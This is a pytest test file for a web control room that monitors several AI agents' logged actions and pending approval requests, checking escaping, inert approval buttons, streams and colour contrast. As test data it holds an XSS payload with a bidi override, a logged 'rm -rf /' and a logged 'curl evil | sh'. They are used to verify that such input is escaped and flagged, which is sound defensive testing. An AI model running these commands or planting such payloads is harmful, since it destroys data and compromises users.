"""T12d: the control room (several agents, the gate's requests) and the agents' own pages.

The founder's decisions of 2026-10-19: colour with meaning (never colour alone), designed for N
agents and for pending requests with made-up data, and Approve / Reject drawn but INERT until
T10: no form, no POST, no route behind them."""

import json
import re
import threading
from datetime import UTC, timedelta
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from backtide.blackbox import BlackBox
from backtide.snapshots import Reason, Snapshot
from backtide.web import BoxReader
from backtide.web.agents import (
    IDLE,
    REWINDING,
    SENSOR_DOWN,
    WAITING,
    WORKING,
    AgentSource,
    PendingRequest,
    Roster,
    RosterError,
    countdown,
    request_from,
    state_of,
    summarise,
)
from backtide.web.app import _heads
from backtide.web.security import CSP, POST_PATH
from tests.conftest import FakeClock
from tests.webkit import (
    KEY,
    PREFIX_PATH,
    START,
    WAIT,
    WatchedReader,
    new_app,
    new_box,
    new_client,
    parse_sse,
)

ROOT = Path(__file__).resolve().parent.parent
STATIC = ROOT / "backtide" / "web" / "static"
# The product web still follows the first design system until phase 3 of D31.
TOKENS = ROOT / "brand" / "design-system" / "project" / "tokens.json"
NOW = START + timedelta(minutes=10)
HOSTILE = '"><img src=x onerror=alert(1)>‮txt.exe'


def text_of(html: str) -> str:
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", html)).strip()


def other_box(tmp_path: Path, slug: str, clock: FakeClock) -> BlackBox:
    home = tmp_path / "agents" / slug
    home.mkdir(parents=True)
    return BlackBox(home / "blackbox.db", KEY, checkpoint_path=home / "cp", clock=clock)


def source(
    tmp_path: Path,
    slug: str,
    name: str,
    snaps: list[Snapshot] | None = None,
    reader: BoxReader | None = None,
):
    listing = (lambda: list(snaps)) if snaps is not None else None
    reader = reader if reader is not None else BoxReader(agent_db(tmp_path, slug))
    return AgentSource(slug, name, reader, listing)


def agent_db(tmp_path: Path, slug: str) -> Path:
    return tmp_path / "agents" / slug / "blackbox.db"


def request(**changes: object) -> PendingRequest:
    values: dict = {
        "id": "r1",
        "agent": "codigo",
        "kind": "email",
        "target": "ana@ejemplo.com",
        "detail": "Asunto: hola",
        "reason": "new_destination",
        "risk": 2,
        "held_at": NOW - timedelta(minutes=1),
        "expires_at": NOW + timedelta(minutes=4, seconds=7),
    }
    values.update(changes)
    return PendingRequest(**values)


@pytest.fixture
def clock() -> FakeClock:
    return FakeClock(START)


@pytest.fixture
def boxes(tmp_path: Path, clock: FakeClock) -> dict[str, BlackBox]:
    main = new_box(tmp_path, clock)
    main.append("system", "service_start", "")
    main.append("system", "agent_start", "")
    main.append("file", "create", "work/notas.md", details={"type": "file"})
    code = other_box(tmp_path, "codigo", clock)
    code.append("system", "agent_start", "")
    code.append("exec", "run", "pytest -q")
    clock.advance(timedelta(minutes=9, seconds=50))
    for i in range(5):
        code.append("file", "delete", f"work/build/f{i}.o", risk=1)
    code.append("exec", "run", "rm -rf /", risk=3)
    return {"main": main, "codigo": code}


@pytest.fixture
def room(tmp_path: Path, boxes: dict[str, BlackBox]) -> TestClient:
    pending = [request(), request(id="r2", agent="principal", kind="delete", target=HOSTILE)]
    return new_client(
        tmp_path,
        clock=lambda: NOW,
        agent_name="OpenClaw personal",
        others=[source(tmp_path, "codigo", "Agente de código")],
        pending=lambda: pending,
    )


# -- the control room ---------------------------------------------------------------------------


def test_home_is_the_control_room(tmp_path: Path) -> None:
    new_box(tmp_path).append("file", "create", "a")
    web = new_client(tmp_path)
    response = web.get("/", follow_redirects=False)
    assert response.status_code == 303 and response.headers["location"] == f"{PREFIX_PATH}/panel"


def test_one_real_agent_is_one_card_and_the_gate_is_announced(tmp_path: Path) -> None:
    box = new_box(tmp_path)
    box.append("system", "agent_start", "")
    box.append("file", "create", "notas.md")
    html = new_client(tmp_path).get("/panel").text
    assert html.count('class="card a-') == 1
    assert "Tu agente" in text_of(html)
    assert "Nada espera tu sí ahora mismo." in text_of(html), "the real gate's list: empty"
    assert "req-yes" not in html
    # one agent: its sections stay in the navigation, as before
    assert f'href="{PREFIX_PATH}/ahora"' in html and f'href="{PREFIX_PATH}/historia"' in html


def test_every_agent_has_a_card_in_its_colour(room: TestClient) -> None:
    html = room.get("/panel").text
    assert 'class="card a-1" id="card-principal"' in html
    assert 'class="card a-2" id="card-codigo"' in html
    text = text_of(html)
    assert "OpenClaw personal" in text and "Agente de código" in text
    assert 'sse-swap="card-codigo"' in html and 'sse-swap="card-principal"' in html


def test_a_card_tells_the_state_the_last_action_and_todays_counts(room: TestClient) -> None:
    html = room.get("/panel").text
    code = html[
        html.index('id="card-codigo"') : html.index("</article>", html.index("card-codigo"))
    ]
    text = text_of(code)
    assert "Ha ejecutado rm -rf /" in text, "the last action, in plain words"
    assert "Hoy 8 acciones" in text and "1 cosa grave" in text
    assert 'class="is-risky"' in code
    assert "1 petición espera tu sí" in text and "espera tu sí" in text
    assert 'class="card-in st-waiting"' in code, "a request waiting: that is its state"
    assert 'class="mini-tide"' in code and 'class="tide-axis"' in code
    assert "Gradient" not in code, "no fade (design system v2): the line is the record"


def test_the_feed_merges_every_agent_newest_first(room: TestClient) -> None:
    html = room.get("/panel").text
    feed = html[html.index('id="pfeed"') :]
    assert 'id="p-codigo-' in feed and 'id="p-principal-' in feed
    assert feed.index("rm -rf /") < feed.index("work/notas.md"), "newest on top"
    assert 'sse-swap="feed"' in html and 'hx-swap="afterbegin"' in html
    assert f'sse-connect="{PREFIX_PATH}/panel/stream?after=3.8"' in html


def test_the_requests_say_what_why_how_serious_and_how_long(room: TestClient) -> None:
    html = room.get("/panel").text
    waiting = html[html.index('id="waiting"') : html.index('class="room"')]
    text = text_of(waiting)
    assert "Esperan tu sí" in text
    assert "Quiere enviar un correo a ana@ejemplo.com" in text
    assert "Frenada porque va a un destino que no ha usado nunca." in text
    assert "riesgo importante" in text
    assert "Se rechaza sola en 4:07" in text
    assert 'data-deadline="' in waiting and 'data-held="' in waiting
    assert waiting.index('id="req-r1"') < waiting.index('id="req-r2"'), "first to run out on top"


def test_approve_and_reject_are_inert_without_aprobar(room: TestClient) -> None:
    """Without `backtide web --aprobar` (decision 10) the buttons are drawn disabled, with a note
    on how to turn them on (T10-5); there is no form and nothing that posts."""
    html = room.get("/panel").text
    waiting = html[html.index('id="waiting"') : html.index('class="room"')]
    assert "<form" not in waiting
    assert not re.search(r"hx-(post|put|patch|delete|get)|formaction|action=", waiting)
    assert "/peticiones/decidir" not in waiting
    buttons = re.findall(r"<button[^>]*>", waiting)
    assert len(buttons) == 4, "two requests, two buttons each"
    for button in buttons:
        assert ' type="button"' in button and " disabled" in button, button
    assert text_of(waiting).count("backtide web --aprobar") == 2


def test_no_route_takes_anything_but_get_except_the_rewind(tmp_path: Path) -> None:
    app = new_app(tmp_path)
    routes = [r for r in app.inner.routes if hasattr(r, "methods")]
    for route in routes:
        if route.path == POST_PATH and "POST" in route.methods:
            continue
        assert route.methods <= {"GET", "HEAD"}, (route.path, route.methods)
    assert any(r.path == "/panel" for r in routes)


@pytest.mark.parametrize(
    "path", ["/panel", "/panel/aprobar", "/panel/requests/r1", "/agentes/codigo/ahora"]
)
def test_a_post_to_the_room_is_refused(room: TestClient, path: str) -> None:
    response = room.post(path, data={"id": "r1"}, headers={"origin": "http://127.0.0.1:8765"})
    assert response.status_code == 405


def test_hostile_text_in_a_request_is_inert(room: TestClient) -> None:
    html = room.get("/panel").text
    assert "<img" not in html and "onerror=alert(1)>" not in html and "‮" not in html
    assert "&lt;img src=x onerror=alert(1)&gt;" in html
    assert ">U+202E</span>" in html
    assert re.search(r'<span class="name">&#34;&gt;&lt;img', html), "an agent's text, quoted"


def test_requests_out_of_time_or_of_no_agent_are_not_shown(tmp_path: Path, boxes) -> None:
    pending = [
        request(id="late", expires_at=NOW - timedelta(seconds=1)),
        request(id="ghost", agent="nadie"),
        request(id="odd", kind="teleport", reason="made-up-rule"),
    ]
    html = (
        new_client(
            tmp_path,
            clock=lambda: NOW,
            others=[source(tmp_path, "codigo", "Agente de código")],
            pending=lambda: pending,
        )
        .get("/panel")
        .text
    )
    assert 'id="req-late"' not in html and 'id="req-ghost"' not in html
    text = text_of(html)
    assert "Quiere hacer algo que la puerta no conoce con" in text
    assert "la puerta no conoce esta acción" in text
    assert "made-up-rule" not in html and "teleport" not in html


def test_the_room_in_english(room: TestClient) -> None:
    text = text_of(room.get("/panel", headers={"accept-language": "en"}).text)
    assert "Control room" in text and "Waiting for your yes" in text
    assert "Wants to send an email to ana@ejemplo.com" in text
    assert "backtide web --aprobar" in text and "Today 8 actions" in text


# -- each agent's own pages ------------------------------------------------------------------------


@pytest.mark.parametrize("page", ["ahora", "historia", "instantaneas", "ahora/preguntar?q=ayuda"])
def test_another_agents_pages_read_its_own_box(room: TestClient, page: str) -> None:
    html = room.get(f"/agentes/codigo/{page}").text
    assert 'class="agentbar a-2"' in html and "Agente de código" in text_of(html)
    assert "work/notas.md" not in html, "the main agent's events stay on its pages"
    if page in ("ahora", "historia"):
        assert "rm -rf /" in html


def test_the_agents_links_stay_under_its_address(room: TestClient) -> None:
    html = room.get("/agentes/codigo/ahora").text
    assert f'sse-connect="{PREFIX_PATH}/agentes/codigo/ahora/stream?after=8"' in html
    assert f'action="{PREFIX_PATH}/agentes/codigo/ahora/preguntar"' in html
    assert f'href="{PREFIX_PATH}/agentes/codigo/historia?origen=file' in html, "the burst link"
    history = room.get("/agentes/codigo/historia", headers={"hx-request": "true"})
    assert history.headers["hx-push-url"] == f"{PREFIX_PATH}/agentes/codigo/historia"
    # the switcher goes to the same section of the other agents
    assert f'href="{PREFIX_PATH}/ahora"' in html


def test_the_main_agent_keeps_its_old_addresses(room: TestClient) -> None:
    html = room.get("/ahora").text
    assert "work/notas.md" in html and 'class="agentbar a-1"' in html
    assert room.get("/agentes/principal/ahora").status_code == 200


@pytest.mark.parametrize("slug", ["nadie", "CODIGO", "%2e%2e", "codigo%2F..", "a" * 40])
def test_an_unknown_agent_is_a_calm_404(room: TestClient, slug: str) -> None:
    response = room.get(f"/agentes/{slug}/ahora")
    assert response.status_code == 404 and "Aquí no hay nada" in response.text


def test_only_the_main_agent_can_be_rewound_from_here(tmp_path: Path, boxes) -> None:
    taken = Snapshot(START, str(Reason.PERIODIC))
    web = new_client(
        tmp_path,
        clock=lambda: NOW,
        others=[source(tmp_path, "codigo", "Agente de código", [taken])],
    )
    html = web.get("/agentes/codigo/instantaneas").text
    assert "Desde aquí solo se rebobina el agente que lleva el servicio" in text_of(html)
    assert "rebobinar?id=" not in html and "rewind-go" not in html
    assert 'disabled aria-label="Volver aquí' in html


def test_the_agent_streams_its_own_box(tmp_path: Path, boxes, clock: FakeClock) -> None:
    watched = WatchedReader(agent_db(tmp_path, "codigo"))
    web = new_client(
        tmp_path,
        stream_seconds=0.4,
        poll_interval=0.02,
        others=[source(tmp_path, "codigo", "Agente de código", reader=watched)],
    )

    def later() -> None:
        watched.wait_read()  # inside the stream, however slow the machine
        boxes["codigo"].append("exec", "run", "make deploy", risk=2)
        boxes["main"].append("exec", "run", "nunca-aqui")

    writer = threading.Thread(target=later)
    writer.start()
    body = web.get("/agentes/codigo/ahora/stream?after=8").text
    writer.join()
    assert "make deploy" in body and "nunca-aqui" not in body


# -- the room's stream ----------------------------------------------------------------------------


def test_the_room_streams_every_agent_cards_and_requests(tmp_path: Path, boxes) -> None:
    pending: list[PendingRequest] = []
    started = threading.Event()

    def listing() -> list[PendingRequest]:
        listed = list(pending)
        started.set()  # the stream has the requests it starts from (and sends only changes)
        return listed

    web = new_client(
        tmp_path,
        stream_seconds=0.6,
        poll_interval=0.02,
        clock=lambda: NOW,
        others=[source(tmp_path, "codigo", "Agente de código")],
        pending=listing,
    )

    def later() -> None:
        # After the stream's first read of the requests: a request already there when it
        # starts is not a change to send (a slow start of the stream lost it that way).
        assert started.wait(WAIT)
        # The request first: a new event makes the stream read the requests at once, and the
        # next read only comes after REQUESTS_EVERY, longer than this stream (CI saw it miss).
        pending.append(request(id="r9"))
        boxes["codigo"].append("exec", "run", "make deploy", risk=2)
        boxes["main"].append("file", "create", "work/plan.md", details={"type": "file"})

    writer = threading.Thread(target=later)
    writer.start()
    events = parse_sse(web.get("/panel/stream?after=3.8").text)
    writer.join()
    feed = "\n".join(e["data"] for e in events if e.get("event") == "feed")
    assert "make deploy" in feed and "work/plan.md" in feed
    assert 'id="p-codigo-9"' in feed and 'id="p-principal-4"' in feed
    assert any(e.get("event") == "requests" and 'id="req-r9"' in e["data"] for e in events)
    assert any(e.get("event") == "card-codigo" for e in events)
    assert any(e.get("id") == "4.9" for e in events), "where to go on from after a reconnect"


def test_the_room_stream_goes_on_from_the_last_event_id(tmp_path: Path, boxes) -> None:
    web = new_client(
        tmp_path,
        stream_seconds=0.5,  # two boxes read before the first poll: room for a slow start
        poll_interval=0.02,
        others=[source(tmp_path, "codigo", "Agente de código")],
    )
    events = parse_sse(web.get("/panel/stream?after=0.0", headers={"last-event-id": "2.7"}).text)
    feed = "\n".join(e["data"] for e in events if e.get("event") == "feed")
    assert 'id="p-principal-3"' in feed and 'id="p-codigo-8"' in feed
    assert 'id="p-principal-2"' not in feed and 'id="p-codigo-7"' not in feed


@pytest.mark.parametrize(
    "text", ["", "1.x", "-1.2", "1..2", "١.٢", "9" * 30, ".".join(["1"] * 100), "1. 2"]
)
def test_junk_positions_start_at_the_end(text: str) -> None:
    assert _heads(text) == []


def test_the_room_and_its_stream_carry_the_reviewed_headers(tmp_path: Path, boxes) -> None:
    web = new_client(
        tmp_path,
        stream_seconds=0.05,
        poll_interval=0.01,
        others=[source(tmp_path, "codigo", "Agente de código")],
    )
    for path in ("/panel", "/agentes/codigo/ahora"):
        assert web.get(path).headers["content-security-policy"] == CSP
    response = web.get("/panel/stream?after=x")
    assert response.headers["content-type"].startswith("text/event-stream")
    assert response.headers["content-security-policy"] == CSP
    assert response.headers["cache-control"] == "no-store"


# -- the view model -----------------------------------------------------------------------------


def _summary(events: list, now=NOW, **options):
    return summarise(list(reversed(events)), now, UTC, **options)


def _events(tmp_path: Path, clock: FakeClock, script) -> list:
    box = new_box(tmp_path, clock)
    script(box, clock)
    return box.events()


def test_states(tmp_path: Path, clock: FakeClock) -> None:
    def busy(box, clock):
        box.append("system", "agent_start", "")
        clock.advance(timedelta(minutes=9, seconds=30))
        box.append("file", "modify", "a")

    events = _events(tmp_path, clock, busy)
    summary = _summary(events)
    assert state_of(summary, 0, NOW) == WORKING
    assert state_of(summary, 0, NOW + timedelta(minutes=5)) == IDLE
    assert state_of(summary, 1, NOW) == WAITING


@pytest.mark.parametrize(
    ("script", "expected"),
    [
        (lambda b: b.append("system", "space_pause", "", details={"frozen": True}), "frozen"),
        (lambda b: b.append("system", "agent_stop", ""), "stopped"),
        (lambda b: b.append("system", "sensor_down", "tetragon", risk=2), SENSOR_DOWN),
        (lambda b: b.append("snapshot", "rewind_requested", "x"), REWINDING),
    ],
)
def test_the_most_urgent_state_wins(tmp_path: Path, clock: FakeClock, script, expected) -> None:
    def run(box, clock):
        box.append("system", "agent_start", "")
        box.append("system", "sensor_start", "")
        script(box)

    summary = _summary(_events(tmp_path, clock, run), now=START + timedelta(minutes=1))
    assert state_of(summary, 0, START + timedelta(minutes=1)) == expected


def test_a_sensor_back_up_is_not_down(tmp_path: Path, clock: FakeClock) -> None:
    def run(box, clock):
        box.append("system", "agent_start", "")
        box.append("system", "sensor_down", "", risk=2)
        box.append("system", "sensor_start", "")

    summary = _summary(_events(tmp_path, clock, run), now=START)
    assert not summary.sensor_down


def test_counts_are_of_today_in_the_persons_time_zone(tmp_path: Path) -> None:
    clock = FakeClock(START - timedelta(hours=12))  # yesterday, in UTC

    def run(box, clock):
        box.append("file", "create", "old", risk=3)
        clock.advance(timedelta(hours=12))
        box.append("file", "create", "new", risk=3)
        box.append("snapshot", "take", "s", snapshot_id="20261016T100000.000000Z-periodic")

    summary = _summary(_events(tmp_path, clock, run))
    assert (summary.events_today, summary.snaps_today, summary.risk3_today) == (2, 1, 1)


def test_the_roster_refuses_bad_slugs_names_and_twins(tmp_path: Path) -> None:
    reader = BoxReader(tmp_path / "x.db")
    for slug in ("", "A", "-a", "a-", "a/b", "a b", "á", "a" * 33):
        with pytest.raises(RosterError):
            AgentSource(slug, None, reader)
    with pytest.raises(RosterError):
        AgentSource("a", "x" * 49, reader)
    with pytest.raises(RosterError):
        Roster(AgentSource("a", None, reader), [AgentSource("a", None, reader)], "/s/p")
    roster = Roster(AgentSource("a", None, reader), [AgentSource("b", "B", reader)], "/s/p")
    assert [a.base for a in roster] == ["/s/p", "/s/p/agentes/b"]
    assert [a.colour for a in roster] == [1, 2]


def test_requests_from_plain_data() -> None:
    good = request_from(
        {
            "id": "r1",
            "agent": "codigo",
            "kind": "pay",
            "target": "x",
            "risk": 3,
            "held_at": "2026-10-16T10:00:00+00:00",
            "expires_at": "2026-10-16T10:05:00+00:00",
        }
    )
    assert good.what == "pay" and good.reason == "unknown"
    at, later = {"held_at": "2026-10-16T10:00Z"}, {"expires_at": "2026-10-16T11:00Z"}
    for bad in (
        {},
        {"id": "r1", "agent": "a", "held_at": "nope", "expires_at": "nope"},
        {"id": "r1", "agent": "a", "held_at": "2026-10-16T10:00", "expires_at": "2026-10-16T11:00"},
        {"id": "<x>", "agent": "a", **at, **later},
        {"id": "r", "agent": "a", "risk": 9, **at, **later},
        {"id": "r", "agent": "a", "risk": True, **at, **later},
        {
            "id": "r",
            "agent": "a",
            "held_at": "2026-10-16T11:00Z",
            "expires_at": "2026-10-16T10:00Z",
        },
    ):
        with pytest.raises(RosterError):
            request_from(bad)


def test_countdown_text() -> None:
    assert countdown(timedelta(minutes=4, seconds=7)) == "4:07"
    assert countdown(timedelta(seconds=-3)) == "0:00"
    assert countdown(timedelta(hours=1, minutes=2, seconds=3)) == "1:02:03"


# -- colour with meaning, light and dark --------------------------------------------------------


def _luminance(colour: str) -> float:
    channels = [int(colour[i : i + 2], 16) / 255 for i in (1, 3, 5)]
    linear = [c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4 for c in channels]
    return 0.2126 * linear[0] + 0.7152 * linear[1] + 0.0722 * linear[2]


def _contrast(a: str, b: str) -> float:
    high, low = sorted((_luminance(a), _luminance(b)), reverse=True)
    return (high + 0.05) / (low + 0.05)


def test_every_app_colour_is_at_least_4_5_to_1_on_paper_and_on_the_washes() -> None:
    tokens = json.loads(TOKENS.read_text())
    base = {t["name"]: t["value"] for t in tokens["color"]["tokens"]}
    app = {t["name"]: t for t in tokens["app"]["color"]["tokens"]}
    for theme in ("light", "dark"):
        grounds = [base["paper"][theme]] + [
            t["value"][theme] for t in app.values() if t["role"] == "surface"
        ]
        texts = [base["ink-muted"][theme], base["ink-soft"][theme]] + [
            t["value"][theme] for t in app.values() if t["role"] != "surface"
        ]
        for ground in grounds:
            for text in texts:
                assert _contrast(text, ground) >= 4.5, (theme, text, ground)


def test_the_css_carries_every_app_token_in_both_themes() -> None:
    """The web loads tokens.css, the system's own (an unchanged copy, test_web_brand)."""
    tokens = json.loads(TOKENS.read_text())
    css = (STATIC / "tokens.css").read_text()
    light = css[: css.index(':root[data-theme="dark"]')]
    dark = css[css.index(':root[data-theme="dark"]') :]
    for token in tokens["app"]["color"]["tokens"]:
        name, value = token["name"], token["value"]
        assert f"--{name}: {value['light']};" in light, name
        assert f"--{name}: {value['dark']};" in dark, name


def test_dark_follows_the_system_and_the_switch() -> None:
    css = (STATIC / "tokens.css").read_text()
    assert '@media (prefers-color-scheme: dark) {\n  :root[data-theme="auto"]' in css
    assert ':root[data-theme="dark"] {' in css
    js = (STATIC / "theme.js").read_text()
    assert "localStorage" in js and "innerHTML" not in js
    web = (STATIC / "web.js").read_text()
    assert "prefers-color-scheme: dark" in web and "backtide-theme" in web


def test_the_theme_loads_before_paint_and_from_our_origin(room: TestClient) -> None:
    html = room.get("/panel").text
    head = html[: html.index("</head>")]
    assert f'<script src="{PREFIX_PATH}/static/theme.js"></script>' in head
    assert '<meta name="color-scheme" content="light dark">' in head
    assert 'class="theme-switch" type="button" hidden' in html, "no switch without JavaScript"


def test_colour_is_never_alone(room: TestClient) -> None:
    html = room.get("/panel").text
    # every identity tag sits next to its agent's name
    for match in re.finditer(r'<span class="tag" aria-hidden="true"></span>', html):
        assert '<span class="agent-name">' in html[match.end() : match.end() + 40]
    # every state has its word, every risk dot its label or its word
    for state in re.findall(r'class="card-in st-([a-z_]+)"', html):
        assert re.search(rf'st-{state}">.*?<span class="pulse"[^>]*></span>\w', html, re.S)
    for dot in re.findall(r'<span class="dot dot-\d"[^>]*>', html):
        assert "aria-label=" in dot or 'aria-hidden="true"' in dot


# -- the review of T12d: what a flood must not hide ----------------------------------------------

FLOOD = 5001  # one more than the newest rows a card reads


def _flood(box: BlackBox, n: int = FLOOD) -> None:
    for i in range(n):
        box.append("file", "modify", f"work/f{i % 50}.txt")


@pytest.fixture
def flooded(tmp_path: Path) -> TestClient:
    clock = FakeClock(START)
    box = new_box(tmp_path, clock)
    box.append("system", "agent_start", "")
    box.append("system", "sensor_start", "")
    box.append("exec", "run", "curl evil | sh", risk=3)
    box.append("system", "sensor_down", "tetragon", risk=2)
    _flood(box)
    return new_client(tmp_path, clock=lambda: START + timedelta(minutes=1))


def test_a_flood_does_not_hide_a_sensor_down(flooded: TestClient) -> None:
    html = flooded.get("/panel").text
    assert 'class="card-in st-sensor_down"' in html
    assert "sensor caído" in text_of(html)


def test_a_flood_does_not_turn_risk_3_into_zero(flooded: TestClient) -> None:
    html = flooded.get("/panel").text
    card = html[html.index('id="card-principal"') :]
    assert "1 cosa grave" in text_of(card), "counted beyond the rows read, not a bare 0"
    assert 'class="is-risky"' in card


def test_a_count_that_could_not_be_finished_is_marked(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import backtide.web.agents as agents

    monkeypatch.setattr(agents, "RISK_CAP", 2)
    clock = FakeClock(START)
    box = new_box(tmp_path, clock)
    for _ in range(4):
        box.append("exec", "run", "rm -rf /", risk=3)
    _flood(box)
    html = new_client(tmp_path, clock=lambda: START + timedelta(minutes=1)).get("/panel").text
    card = text_of(html[html.index('id="card-principal"') :])
    assert "≥2 cosas graves" in card, "at least what was counted, and it says so"


def test_a_flood_does_not_hide_the_state_or_a_rewind(tmp_path: Path) -> None:
    clock = FakeClock(START)
    box = new_box(tmp_path, clock)
    box.append("system", "agent_start", "")
    box.append("system", "space_pause", "", details={"frozen": True})
    _flood(box)
    html = new_client(tmp_path, clock=lambda: START + timedelta(minutes=1)).get("/panel").text
    assert 'class="card-in st-frozen"' in html
    box.append("system", "space_resume", "")
    box.append("snapshot", "rewind_requested", "x")
    _flood(box)
    html = new_client(tmp_path, clock=lambda: START + timedelta(minutes=1)).get("/panel").text
    assert 'class="card-in st-rewinding"' in html


def test_the_watch_reads_only_what_is_new_after_the_first_time(tmp_path: Path) -> None:
    """After the first look, a card only queries the events it has not seen (the box's
    ``source``/``action`` and ``risk`` have no index: a whole-box query on every refresh would
    let a flood make the web slow)."""
    from backtide.web.agents import Watch

    clock = FakeClock(START)
    box = new_box(tmp_path, clock)
    box.append("system", "agent_start", "")
    box.append("system", "sensor_down", "", risk=2)
    _flood(box, 30)
    reader = BoxReader(tmp_path / "blackbox.db")
    calls: list[dict] = []
    real = reader.events

    def spy(**filters):  # noqa: ANN202 - the reader's own result
        calls.append(filters)
        return real(**filters)

    reader.events = spy  # type: ignore[method-assign]
    watch = Watch(reader)
    midnight = START.replace(hour=0)
    watch.update(real(newest_first=True, limit=10), midnight)
    assert watch.newest["sensor"] is not None and watch.newest["sensor"].action == "sensor_down"
    assert all("since_seq" in c for c in calls)
    calls.clear()
    _flood(box, 5)
    watch.update(real(newest_first=True, limit=10), midnight)
    assert calls == [], "the newest rows cover everything new: no query at all"
    _flood(box, 30)
    watch.update(real(newest_first=True, limit=10), midnight)
    assert calls and all(c["since_seq"] >= 30 for c in calls), "only the gap since last time"
    assert watch.newest["sensor"].action == "sensor_down"


def test_an_unreadable_request_list_says_so(tmp_path: Path, boxes) -> None:
    def broken() -> list[PendingRequest]:
        raise OSError("gone")

    response = new_client(tmp_path, clock=lambda: NOW, pending=broken).get("/panel")
    assert response.status_code == 200
    text = text_of(response.text)
    assert "No se puede leer la lista de peticiones" in text
    assert "Nada espera tu sí" not in text


def test_the_stream_keeps_the_last_list_when_it_cannot_read_it(tmp_path: Path, boxes) -> None:
    reads = 0

    def listing() -> list[PendingRequest]:
        nonlocal reads
        reads += 1
        if reads > 2:  # read where the stream starts and at its first poll; then it is gone
            raise OSError("gone")
        return [request(id="r7", agent="principal")]

    web = new_client(
        tmp_path,
        stream_seconds=0.5,
        poll_interval=0.02,
        clock=lambda: NOW,
        pending=listing,
    )
    import backtide.web.app as app_module

    old = app_module.REQUESTS_EVERY
    app_module.REQUESTS_EVERY = 0.05
    try:
        events = parse_sse(web.get("/panel/stream").text)
    finally:
        app_module.REQUESTS_EVERY = old
    sent = [e["data"] for e in events if e.get("event") == "requests"]
    assert sent, "the failure is told"
    assert 'id="req-r7"' in sent[-1], "the last list it read stays"
    assert "puede no estar al día" in text_of(sent[-1])
    assert len(sent) == 1, "said once, not on every poll"


def test_a_cards_key_follows_its_version_not_where_it_lives_in_memory(tmp_path: Path) -> None:
    """``id()`` of a freed summary can come back for the next one: the key is a version."""
    from dataclasses import replace

    from backtide.web.agents import card, empty_summary

    roster = Roster(AgentSource("a", None, BoxReader(tmp_path / "x.db")), [], "/s/p")
    first = replace(empty_summary(NOW), version=1)
    same = replace(empty_summary(NOW), version=1)
    later = replace(empty_summary(NOW), version=2)
    agent = roster.main
    assert card(agent, first, [], NOW).key == card(agent, same, [], NOW).key
    assert card(agent, first, [], NOW).key != card(agent, later, [], NOW).key
